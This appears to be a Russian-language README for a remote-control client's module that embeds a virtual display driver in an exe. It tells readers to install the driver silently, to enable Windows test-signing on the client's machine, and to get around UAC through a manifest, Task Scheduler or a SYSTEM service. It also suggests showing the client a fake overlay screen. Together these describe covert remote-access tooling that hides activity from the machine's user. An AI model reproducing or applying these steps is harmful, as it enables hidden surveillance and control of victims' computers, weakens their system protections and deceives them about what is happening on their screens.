# Virtual Display Driver Integration

Этот модуль позволяет интегрировать IDD (Indirect Display Driver) в exe файл для создания виртуального дисплея без видимых уведомлений.

## ⚠️ Важно о подписи драйверов

Windows требует подписанные драйверы. Варианты:

1. **Использовать подписанный драйвер** (рекомендуется)
   - IddSampleDriver от Microsoft (требует тестовый режим)
   - Parsec VDD (подписан, работает без тестового режима)

2. **Включить тестовый режим Windows** (на машине клиента)
   ```cmd
   bcdedit /set testsigning on
   ```
   После этого неподписанные драйверы устанавливаются без уведомлений.

3. **Получить WHQL сертификат** (дорого, для коммерческих продуктов)

## Подготовка драйвера

### Шаг 1: Скачайте драйвер

```bash
cd client/remote_client/windows/drivers
python download_driver.py
```

Это создаст папку `vdd/` с файлами драйвера.

### Шаг 2: Добавьте в PyInstaller

В файле `.spec` добавьте:

```python
from remote_client.windows.vdd_driver import get_driver_data_files

a = Analysis(
    ...
    datas=[
        ('remote_client/windows/drivers/vdd', 'drivers/vdd'),
    ] + get_driver_data_files(),
    ...
)
```

Или вручную:

```python
datas=[
    ('remote_client/windows/drivers/vdd/*.inf', 'drivers/vdd'),
    ('remote_client/windows/drivers/vdd/*.sys', 'drivers/vdd'),
    ('remote_client/windows/drivers/vdd/*.cat', 'drivers/vdd'),
]
```

### Шаг 3: Сборка exe

```bash
pyinstaller RemoteControllerClient.spec
```

## Использование в коде

```python
from remote_client.windows.virtual_display import VirtualDisplaySession

# Автоматически попробует:
# 1. Embedded драйвер (из exe)
# 2. Установленный драйвер
# 3. Скачать и установить (если админ)
session = VirtualDisplaySession()

if session.start(width=1920, height=1080, auto_install=True):
    # Виртуальный дисплей готов
    region = session.get_capture_region()
    # Используйте region для захвата через mss
    
session.stop()
```

## Тихая установка

Для установки без **любых** уведомлений нужно:

1. ✅ Запуск от имени Администратора
2. ✅ Подписанный драйвер ИЛИ тестовый режим Windows
3. ✅ UAC уже подтверждён (при запуске exe)

### Варианты обхода UAC

1. **Встроить manifest с requireAdministrator**
   ```xml
   <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
   ```

2. **Запускать через Task Scheduler с повышенными правами**

3. **Использовать сервис Windows** (запускается от SYSTEM)

## Структура файлов

```
drivers/
├── README.md           # Эта документация
├── download_driver.py  # Скрипт скачивания драйвера
└── vdd/                # Папка с драйвером (после скачивания)
    ├── IddSampleDriver.inf
    ├── IddSampleDriver.sys
    └── IddSampleDriver.cat
```

## Альтернативы без драйверов

Если драйвер не подходит, есть другие варианты:

1. **Overlay-заглушка** - показать клиенту фейковый экран
2. **Fallback режим** - захват основного экрана (клиент видит)
3. **RDP/VNC** - работать через удалённый рабочий стол
